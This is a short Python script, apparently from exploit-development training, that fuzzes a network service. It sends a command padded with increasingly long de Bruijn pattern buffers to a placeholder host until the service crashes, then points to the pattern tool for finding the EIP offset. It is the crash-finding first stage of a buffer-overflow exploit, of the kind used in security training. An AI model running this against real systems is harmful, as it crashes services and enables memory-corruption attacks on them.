#!/usr/bin/env python3
import socket, time, sys
from pattern import bruijn

RHOST = "changeme"
RPORT = 1337
timeout = 2
step = 100

# non-repeating pattern with a length of 10000
pattern = bruijn().encode("utf-8")

print("Testing {0}, {1}, {2}... up to 10000".format(step, step*2, step*3))
for i in range(0, len(pattern), step):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((RHOST, RPORT))
        print("Sending buffer with a size of {0}".format(i))
        s.recv(1024)
        s.send(b"somecommand "+pattern[:i]+b"\r\n")
        s.close()
        time.sleep(1)
    except:
        print("Last buffer probably crashed the server. Have a look at it.")
        print("./pattern.py <EIP>")
        sys.exit(0)
